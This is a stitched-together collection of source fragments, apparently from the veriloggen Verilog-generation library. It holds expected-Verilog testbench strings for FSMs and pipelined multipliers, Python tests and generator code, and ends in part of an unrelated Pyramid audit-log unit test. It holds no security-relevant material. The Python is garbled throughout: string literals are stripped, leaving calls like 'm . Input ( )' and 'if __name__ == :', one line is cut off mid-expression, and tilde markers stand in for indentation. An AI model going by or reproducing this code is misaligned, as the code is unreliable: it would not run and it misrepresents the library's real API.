yfsm_21: begin\n          yvalid <= 1;\n          yfsm <= yfsm_22;\n        end\n        yfsm_22: begin\n          if(yready) begin\n            ydata <= ydata + 1;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yvalid <= 0;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yfsm <= yfsm_23;\n          end \n        end\n        yfsm_23: begin\n          yfsm <= yfsm_24;\n        end\n        yfsm_24: begin\n          yfsm <= yfsm_25;\n        end\n        yfsm_25: begin\n          yfsm <= yfsm_26;\n        end\n        yfsm_26: begin\n          yfsm <= yfsm_27;\n        end\n        yfsm_27: begin\n          yfsm <= yfsm_28;\n        end\n        yfsm_28: begin\n          yfsm <= yfsm_29;\n        end\n        yfsm_29: begin\n          yfsm <= yfsm_30;\n        end\n        yfsm_30: begin\n          yfsm <= yfsm_31;\n        end\n        yfsm_31: begin\n          yfsm <= yfsm_32;\n        end\n        yfsm_32: begin\n          yfsm <= yfsm_33;\n        end\n        yfsm_33: begin\n          yfsm <= yfsm_34;\n        end\n        yfsm_34: begin\n          yfsm <= yfsm_35;\n        end\n        yfsm_35: begin\n          yfsm <= yfsm_36;\n        end\n        yfsm_36: begin\n          yfsm <= yfsm_37;\n        end\n        yfsm_37: begin\n          yfsm <= yfsm_38;\n        end\n        yfsm_38: begin\n          yfsm <= yfsm_39;\n        end\n        yfsm_39: begin\n          yfsm <= yfsm_40;\n        end\n        yfsm_40: begin\n          yfsm <= yfsm_41;\n        end\n        yfsm_41: begin\n          yfsm <= yfsm_42;\n        end\n        yfsm_42: begin\n          yfsm <= yfsm_43;\n        end\n        yfsm_43: begin\n          yvalid <= 1;\n          if(yready) begin\n            ydata <= ydata + 1;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yvalid <= 0;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yfsm <= yfsm_44;\n          end \n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n  localparam zfsm_9 = 9;\n  localparam zfsm_10 = 10;\n  localparam zfsm_11 = 11;\n  localparam zfsm_12 = 12;\n  localparam zfsm_13 = 13;\n  localparam zfsm_14 = 14;\n  localparam zfsm_15 = 15;\n  localparam zfsm_16 = 16;\n  localparam zfsm_17 = 17;\n  localparam zfsm_18 = 18;\n  localparam zfsm_19 = 19;\n  localparam zfsm_20 = 20;\n  localparam zfsm_21 = 21;\n  localparam zfsm_22 = 22;\n  localparam zfsm_23 = 23;\n  localparam zfsm_24 = 24;\n  localparam zfsm_25 = 25;\n  localparam zfsm_26 = 26;\n  localparam zfsm_27 = 27;\n  localparam zfsm_28 = 28;\n  localparam zfsm_29 = 29;\n  localparam zfsm_30 = 30;\n  localparam zfsm_31 = 31;\n  localparam zfsm_32 = 32;\n  localparam zfsm_33 = 33;\n  localparam zfsm_34 = 34;\n  localparam zfsm_35 = 35;\n  localparam zfsm_36 = 36;\n  localparam zfsm_37 = 37;\n  localparam zfsm_38 = 38;\n  localparam zfsm_39 = 39;\n  localparam zfsm_40 = 40;\n  localparam zfsm_41 = 41;\n  localparam zfsm_42 = 42;\n  localparam zfsm_43 = 43;\n  localparam zfsm_44 = 44;\n  localparam zfsm_45 = 45;\n  localparam zfsm_46 = 46;\n  localparam zfsm_47 = 47;\n  localparam zfsm_48 = 48;\n  localparam zfsm_49 = 49;\n  localparam zfsm_50 = 50;\n  localparam zfsm_51 = 51;\n  localparam zfsm_52 = 52;\n  localparam zfsm_53 = 53;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          zready <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(zvalid) begin\n            zready <= 1;\n          end \n          if(zvalid) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          zready <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          zready <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          zready <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          zready <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          zready <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          zready <= 0;\n          zfsm <= zfsm_9;\n        end\n        zfsm_9: begin\n          zready <= 0;\n          zfsm <= zfsm_10;\n        end\n        zfsm_10: begin\n          zready <= 0;\n          zfsm <= zfsm_11;\n        end\n        zfsm_11: begin\n          zready <= 0;\n          zfsm <= zfsm_12;\n        end\n        zfsm_12: begin\n          zready <= 0;\n          zfsm <= zfsm_13;\n        end\n        zfsm_13: begin\n          zready <= 0;\n          zfsm <= zfsm_14;\n        end\n        zfsm_14: begin\n          zready <= 0;\n          zfsm <= zfsm_15;\n        end\n        zfsm_15: begin\n          zready <= 0;\n          zfsm <= zfsm_16;\n        end\n        zfsm_16: begin\n          zready <= 0;\n          zfsm <= zfsm_17;\n        end\n        zfsm_17: begin\n          zready <= 0;\n          zfsm <= zfsm_18;\n        end\n        zfsm_18: begin\n          zready <= 0;\n          zfsm <= zfsm_19;\n        end\n        zfsm_19: begin\n          zready <= 0;\n          zfsm <= zfsm_20;\n        end\n        zfsm_20: begin\n          zready <= 0;\n          zfsm <= zfsm_21;\n        end\n        zfsm_21: begin\n          zready <= 0;\n          zfsm <= zfsm_22;\n        end\n        zfsm_22: begin\n          zready <= 0;\n          zfsm <= zfsm_23;\n        end\n        zfsm_23: begin\n          zready <= 0;\n          zfsm <= zfsm_24;\n        end\n        zfsm_24: begin\n          zready <= 0;\n          zfsm <= zfsm_25;\n        end\n        zfsm_25: begin\n          zready <= 0;\n          zfsm <= zfsm_26;\n        end\n        zfsm_26: begin\n          zready <= 0;\n          zfsm <= zfsm_27;\n        end\n        zfsm_27: begin\n          zready <= 0;\n          zfsm <= zfsm_28;\n        end\n        zfsm_28: begin\n          zready <= 0;\n          zfsm <= zfsm_29;\n        end\n        zfsm_29: begin\n          zready <= 0;\n          zfsm <= zfsm_30;\n        end\n        zfsm_30: begin\n          zready <= 0;\n          zfsm <= zfsm_31;\n        end\n        zfsm_31: begin\n          zready <= 0;\n          zfsm <= zfsm_32;\n        end\n        zfsm_32: begin\n          zready <= 0;\n          zfsm <= zfsm_33;\n        end\n        zfsm_33: begin\n          zready <= 0;\n          zfsm <= zfsm_34;\n        end\n        zfsm_34: begin\n          zready <= 0;\n          zfsm <= zfsm_35;\n        end\n        zfsm_35: begin\n          zready <= 0;\n          zfsm <= zfsm_36;\n        end\n        zfsm_36: begin\n          zready <= 0;\n          zfsm <= zfsm_37;\n        end\n        zfsm_37: begin\n          zready <= 0;\n          zfsm <= zfsm_38;\n        end\n        zfsm_38: begin\n          zready <= 0;\n          zfsm <= zfsm_39;\n        end\n        zfsm_39: begin\n          zready <= 0;\n          zfsm <= zfsm_40;\n        end\n        zfsm_40: begin\n          zready <= 0;\n          zfsm <= zfsm_41;\n        end\n        zfsm_41: begin\n          zready <= 0;\n          zfsm <= zfsm_42;\n        end\n        zfsm_42: begin\n          zready <= 0;\n          zfsm <= zfsm_43;\n        end\n        zfsm_43: begin\n          zready <= 0;\n          zfsm <= zfsm_44;\n        end\n        zfsm_44: begin\n          zready <= 0;\n          zfsm <= zfsm_45;\n        end\n        zfsm_45: begin\n          zready <= 0;\n          zfsm <= zfsm_46;\n        end\n        zfsm_46: begin\n          zready <= 0;\n          zfsm <= zfsm_47;\n        end\n        zfsm_47: begin\n          zready <= 0;\n          zfsm <= zfsm_48;\n        end\n        zfsm_48: begin\n          zready <= 0;\n          zfsm <= zfsm_49;\n        end\n        zfsm_49: begin\n          zready <= 0;\n          zfsm <= zfsm_50;\n        end\n        zfsm_50: begin\n          zready <= 0;\n          zfsm <= zfsm_51;\n        end\n        zfsm_51: begin\n          zready <= 0;\n          zfsm <= zfsm_52;\n        end\n        zfsm_52: begin\n          zready <= 0;\n          zfsm <= zfsm_53;\n        end\n        zfsm_53: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(xvalid && xready) begin\n        $display("xdata=%d", xdata);\n      end \n      if(yvalid && yready) begin\n        $display("ydata=%d", ydata);\n      end \n      if(zvalid && zready) begin\n        $display("zdata=%d", zdata);\n      end \n    end \n  end\n\n\nendmodule\n\n\n\nmodule main\n(\n  input CLK,\n  input RST,\n  input [32-1:0] xdata,\n  input xvalid,\n  output xready,\n  input [32-1:0] ydata,\n  input yvalid,\n  output yready,\n  output [32-1:0] zdata,\n  output zvalid,\n  input zready\n);\n\n  wire [32-1:0] _tmp_data_0;\n  wire _tmp_valid_0;\n  wire _tmp_ready_0;\n  wire [64-1:0] _tmp_odata_0;\n  reg [64-1:0] _tmp_data_reg_0;\n  assign _tmp_data_0 = _tmp_data_reg_0;\n  wire _tmp_ovalid_0;\n  reg _tmp_valid_reg_0;\n  assign _tmp_valid_0 = _tmp_valid_reg_0;\n  wire _tmp_enable_0;\n  wire _tmp_update_0;\n  assign _tmp_enable_0 = (_tmp_ready_0 || !_tmp_valid_0) && (xready && yready) && (xvalid && yvalid);\n  assign _tmp_update_0 = _tmp_ready_0 || !_tmp_valid_0;\n\n  multiplier_0\n  mul0\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .update(_tmp_update_0),\n    .enable(_tmp_enable_0),\n    .valid(_tmp_ovalid_0),\n    .a(xdata),\n    .b(ydata),\n    .c(_tmp_odata_0)\n  );\n\n  assign xready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign yready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign zdata = _tmp_data_0;\n  assign zvalid = _tmp_valid_0;\n  assign _tmp_ready_0 = zready;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _tmp_data_reg_0 <= 0;\n      _tmp_valid_reg_0 <= 0;\n    end else begin\n      if(_tmp_ready_0 || !_tmp_valid_0) begin\n        _tmp_data_reg_0 <= _tmp_odata_0;\n      end \n      if(_tmp_ready_0 || !_tmp_valid_0) begin\n        _tmp_valid_reg_0 <= _tmp_ovalid_0;\n      end \n    end\n  end\n\n\nendmodule\n\n\n\nmodule multiplier_0\n(\n  input CLK,\n  input RST,\n  input update,\n  input enable,\n  output valid,\n  input [32-1:0] a,\n  input [32-1:0] b,\n  output [64-1:0] c\n);\n\n  reg valid_reg0;\n  reg valid_reg1;\n  reg valid_reg2;\n  reg valid_reg3;\n  reg valid_reg4;\n  reg valid_reg5;\n  assign valid = valid_reg5;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      valid_reg0 <= 0;\n      valid_reg1 <= 0;\n      valid_reg2 <= 0;\n      valid_reg3 <= 0;\n      valid_reg4 <= 0;\n      valid_reg5 <= 0;\n    end else begin\n      if(update) begin\n        valid_reg0 <= enable;\n        valid_reg1 <= valid_reg0;\n        valid_reg2 <= valid_reg1;\n        valid_reg3 <= valid_reg2;\n        valid_reg4 <= valid_reg3;\n        valid_reg5 <= valid_reg4;\n      end \n    end\n  end\n\n\n  multiplier_core_0\n  mult\n  (\n    .CLK(CLK),\n    .update(update),\n    .a(a),\n    .b(b),\n    .c(c)\n  );\n\n\nendmodule\n\n\n\nmodule multiplier_core_0\n(\n  input CLK,\n  input update,\n  input [32-1:0] a,\n  input [32-1:0] b,\n  output [64-1:0] c\n);\n\n  reg [32-1:0] _a;\n  reg [32-1:0] _b;\n  reg signed [64-1:0] _tmpval0;\n  reg signed [64-1:0] _tmpval1;\n  reg signed [64-1:0] _tmpval2;\n  reg signed [64-1:0] _tmpval3;\n  reg signed [64-1:0] _tmpval4;\n  wire signed [64-1:0] rslt;\n  assign rslt = $signed({ 1\'d0, _a }) * $signed({ 1\'d0, _b });\n  assign c = _tmpval4;\n\n  always @(posedge CLK) begin\n    if(update) begin\n      _a <= a;\n      _b <= b;\n      _tmpval0 <= rslt;\n      _tmpval1 <= _tmpval0;\n      _tmpval2 <= _tmpval1;\n      _tmpval3 <= _tmpval2;\n      _tmpval4 <= _tmpval3;\n    end \n  end\n\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = dataflow_mul . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
valid = m . OutputReg ( , initval = 0 ) \n 
count = m . Reg ( , width = 32 , initval = 0 ) \n 
\n 
up = m . Wire ( ) \n 
down = m . Wire ( ) \n 
m . Assign ( up ( 1 ) ) \n 
m . Assign ( down ( 0 ) ) \n 
\n 
fsm = FSM ( m , , clk , rst ) \n 
\n 
for i in range ( 4 ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
# condition alias \n 
~~ c = count >= 16 \n 
\n 
# assert valid if the condition is satisfied \n 
# then de-assert 3 cycles later with same condition \n 
fsm . add ( valid ( up ) , cond = c , keep = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . add ( valid ( down ) , cond = c , delay = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . goto_next ( cond = c ) \n 
\n 
for i in range ( 8 ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
# condition alias \n 
~~ c = count >= 32 \n 
\n 
# assert valid 1 cycle later if the condition is satisfied now \n 
# then de-assert 4 cycles later with same condition \n 
for i in range ( 8 ) : \n 
~~~ fsm . add ( valid ( up ) , cond = c , delay = 1 , keep = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . add ( valid ( down ) , cond = c , delay = 4 , eager_val = True , lazy_cond = True ) \n 
fsm . goto_next ( cond = c ) \n 
\n 
~~ fsm . make_always ( reset = [ count . reset ( ) ] , body = [ count ( count + 1 ) ] ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Reg ( ) \n 
rst = m . Reg ( ) \n 
valid = m . Wire ( ) \n 
\n 
uut = m . Instance ( mkLed ( ) , , \n 
ports = ( ( , clk ) , ( , rst ) , ( , valid ) ) ) \n 
\n 
simulation . setup_waveform ( m , uut ) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import pipeline_draw_graph \n 
\n 
expected_verilog = """\nmodule test\n(\n);\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] x;\n  reg vx;\n  wire rx;\n  reg [32-1:0] y;\n  reg vy;\n  wire ry;\n  wire [32-1:0] z;\n  wire vz;\n  reg rz;\n\n  blinkled\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .x(x),\n    .vx(vx),\n    .rx(rx),\n    .y(y),\n    .vy(vy),\n    .ry(ry),\n    .z(z),\n    .vz(vz),\n    .rz(rz)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    x = 0;\n    y = 0;\n    vx = 0;\n    vy = 0;\n    rz = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] _tmp_0;\n  reg [32-1:0] _tmp_1;\n  reg [32-1:0] _tmp_2;\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          vx <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          vx <= 1;\n          if(rx) begin\n            x <= x + 1;\n          end \n          if(rx) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && rx) begin\n            xfsm <= xfsm_2;\n          end \n        end\n        xfsm_2: begin\n          vx <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          vy <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          vy <= 1;\n          if(ry) begin\n            y <= y + 2;\n          end \n          if(ry) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && ry) begin\n            yfsm <= yfsm_2;\n          end \n        end\n        yfsm_2: begin\n          vy <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n  localparam zfsm_9 = 9;\n  localparam zfsm_10 = 10;\n  localparam zfsm_11 = 11;\n  localparam zfsm_12 = 12;\n  localparam zfsm_13 = 13;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          rz <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(vz) begin\n            rz <= 1;\n          end \n          if(vz) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          rz <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          rz <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          rz <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          rz <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          rz <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          rz <= 0;\n          zfsm <= zfsm_9;\n        end\n        zfsm_9: begin\n          rz <= 0;\n          zfsm <= zfsm_10;\n        end\n        zfsm_10: begin\n          rz <= 0;\n          zfsm <= zfsm_11;\n        end\n        zfsm_11: begin\n          rz <= 0;\n          zfsm <= zfsm_12;\n        end\n        zfsm_12: begin\n          rz <= 0;\n          zfsm <= zfsm_13;\n        end\n        zfsm_13: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(vx && rx) begin\n        $display("x=%d", x);\n      end \n      if(vy && ry) begin\n        $display("y=%d", y);\n      end \n      if(vz && rz) begin\n        $display("z=%d", z);\n      end \n    end \n  end\n\nendmodule\n\nmodule blinkled\n(\n  input CLK,\n  input RST,\n  input [32-1:0] x,\n  input vx,\n  output rx,\n  input [32-1:0] y,\n  input vy,\n  output ry,\n  output [32-1:0] z,\n  output vz,\n  input rz\n);\n\n  assign rx = (_df_ready_0 || !_df_valid_0) && (vx && vy);\n  assign ry = (_df_ready_0 || !_df_valid_0) && (vx && vy);\n  reg [32-1:0] _df_data_0;\n  reg _df_valid_0;\n  wire _df_ready_0;\n  assign _df_ready_0 = rz;\n  assign z = _df_data_0;\n  assign vz = _df_valid_0;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _df_data_0 <= 0;\n      _df_valid_0 <= 0;\n    end else begin\n      if(vx && vy && (rx && ry) && (_df_ready_0 || !_df_valid_0)) begin\n        _df_data_0 <= x + y;\n      end \n      if(_df_valid_0 && _df_ready_0) begin\n        _df_valid_0 <= 0;\n      end \n      if(rx && ry && (_df_ready_0 || !_df_valid_0)) begin\n        _df_valid_0 <= vx && vy;\n      end \n    end\n  end\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = pipeline_draw_graph . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
interval = m . Parameter ( , 16 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , 8 , initval = 0 ) \n 
count = m . Reg ( , 32 , initval = 0 ) \n 
\n 
seq = Seq ( m , , clk , rst ) \n 
seq . add ( Systask ( , , led , count ) ) \n 
seq . add ( count ( count + 1 ) , cond = count < interval - 1 ) \n 
seq . add ( count ( 0 ) , cond = count == interval - 1 ) \n 
seq . add ( led ( led + 1 ) , cond = count == interval - 1 ) \n 
\n 
seq . make_always ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
led = mkLed ( ) \n 
\n 
# copy paras and ports \n 
params = m . copy_params ( led ) \n 
ports = m . copy_sim_ports ( led ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
uut = m . Instance ( led , , \n 
params = m . connect_params ( led ) , \n 
ports = m . connect_ports ( led ) ) \n 
\n 
#simulation.setup_waveform(m, uut) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , m . make_reset ( ) , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import read_verilog_module_str \n 
\n 
expected_verilog = """\nmodule top #\n  (\n   parameter WIDTH = 8\n  )\n  (\n   input CLK, \n   input RST, \n   output [WIDTH-1:0] LED\n  );\n  blinkled #\n  (\n   .WIDTH(WIDTH)\n  )\n  inst_blinkled\n  (\n   .CLK(CLK),\n   .RST(RST),\n   .LED(LED)\n  );\nendmodule\n\nmodule blinkled #\n  (\n   parameter WIDTH = 8\n  )\n  (\n   input CLK, \n   input RST, \n   output reg [WIDTH-1:0] LED\n  );\n  reg [32-1:0] count;\n  always @(posedge CLK) begin\n    if(RST) begin        \n      count <= 0;\n    end else begin\n      if(count == 1023) begin\n        count <= 0;\n      end else begin\n        count <= count + 1;\n      end\n    end \n  end \n  always @(posedge CLK) begin\n    if(RST) begin        \n      LED <= 0;\n    end else begin\n      if(count == 1023) begin        \n        LED <= LED + 1;\n      end  \n    end \n  end \nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = read_verilog_module_str . mkTop ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
\n 
import veriloggen . core . vtypes as vtypes \n 
import veriloggen . core . module as module \n 
\n 
def mkMultiplierCore ( index , lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ retwidth = lwidth + rwidth \n 
\n 
m = module . Module ( % index ) \n 
\n 
clk = m . Input ( ) \n 
update = m . Input ( ) \n 
\n 
a = m . Input ( , lwidth ) \n 
b = m . Input ( , rwidth ) \n 
c = m . Output ( , retwidth ) \n 
\n 
_a = m . Reg ( , lwidth , signed = lsigned ) \n 
_b = m . Reg ( , rwidth , signed = rsigned ) \n 
tmpval = [ m . Reg ( % i , retwidth , signed = True ) for i in range ( depth - 1 ) ] \n 
rslt = m . Wire ( , retwidth , signed = True ) \n 
\n 
__a = _a \n 
__b = _b \n 
if not lsigned : \n 
~~~ __a = vtypes . SystemTask ( , vtypes . Cat ( vtypes . Int ( 0 , width = 1 ) , _a ) ) \n 
~~ if not rsigned : \n 
~~~ __b = vtypes . SystemTask ( , vtypes . Cat ( vtypes . Int ( 0 , width = 1 ) , _b ) ) \n 
\n 
~~ m . Assign ( rslt ( __a * __b ) ) \n 
m . Assign ( c ( tmpval [ depth - 2 ] ) ) \n 
\n 
m . Always ( vtypes . Posedge ( clk ) ) ( \n 
vtypes . If ( update ) ( \n 
_a ( a ) , \n 
_b ( b ) , \n 
tmpval [ 0 ] ( rslt ) , \n 
[ tmpval [ i ] ( tmpval [ i - 1 ] ) for i in range ( 1 , depth - 1 ) ] \n 
) ) \n 
\n 
return m \n 
\n 
~~ def mkMultiplier ( index , lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ if lwidth < 0 : raise ValueError ( "data width must be greater than 0." ) \n 
if rwidth < 0 : raise ValueError ( "data width must be greater than 0." ) \n 
if depth < 2 : raise ValueError ( "depth must be greater than 2." ) \n 
\n 
retwidth = lwidth + rwidth \n 
\n 
mult = mkMultiplierCore ( index , lwidth , rwidth , lsigned , rsigned , depth ) \n 
\n 
m = module . Module ( % index ) \n 
\n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
\n 
update = m . Input ( ) \n 
enable = m . Input ( ) \n 
valid = m . Output ( ) \n 
\n 
a = m . Input ( , lwidth ) \n 
b = m . Input ( , rwidth ) \n 
c = m . Output ( , retwidth ) \n 
\n 
valid_reg = [ m . Reg ( % i ) for i in range ( depth ) ] \n 
\n 
m . Assign ( valid ( valid_reg [ depth - 1 ] ) ) \n 
\n 
m . Always ( vtypes . Posedge ( clk ) ) ( \n 
vtypes . If ( rst ) ( \n 
[ valid_reg [ i ] ( 0 ) for i in range ( depth ) ] \n 
) . Else ( \n 
vtypes . If ( update ) ( \n 
valid_reg [ 0 ] ( enable ) , \n 
[ valid_reg [ i ] ( valid_reg [ i - 1 ] ) for i in range ( 1 , depth ) ] \n 
) \n 
) ) \n 
\n 
ports = [ ( , clk ) , ( , update ) , ( , a ) , ( , b ) , ( , c ) ] \n 
m . Instance ( mult , , ports = ports ) \n 
\n 
return m \n 
\n 
# global multiplier count \n 
~~ index_count = 0 \n 
def get_mul ( lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ global index_count \n 
mul = mkMultiplier ( index_count , lwidth , rwidth , lsigned , rsigned , depth ) \n 
index_count += 1 \n 
return mul \n 
\n 
~~ def reset ( ) : \n 
~~~ global index_count \n 
index_count = 0 \n 
~~ import json \n 
import unittest \n 
from pyramid import testing \n 
import mock \n 
\n 
class Test_acl_modified ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . request = testing . DummyRequest ( ) \n 
self . config = testing . setUp ( request = self . request ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ testing . tearDown ( ) \n 
\n 
~~ def _callFUT ( self , event ) : \n 
~~~ from . . subscribers import acl_modified \n 
return acl_modified ( event ) \n 
\n 
~~ @ mock . patch ( ) \n 
def test_it ( self , mock_get_auditlog ) : \n 
~~~ from substanced . audit import AuditLog \n 
self . request . user = Dummy ( { : 1 , : } ) \n 
event = Dummy ( ) \n 
context = testing . DummyResource ( ) \n 
auditlog = AuditLog ( ) \n 
mock_get_auditlog . side_effect = lambda c : auditlog \n 
context . __oid__ = 5 \n 
event . registry = _makeRegistry ( ) \n 
event . object = context \n 
event . old_acl = \n 
event . new_acl = \n 
self . _callFUT ( event ) \n 
self . assertEqual ( len ( auditlog ) , 1 ) \n 
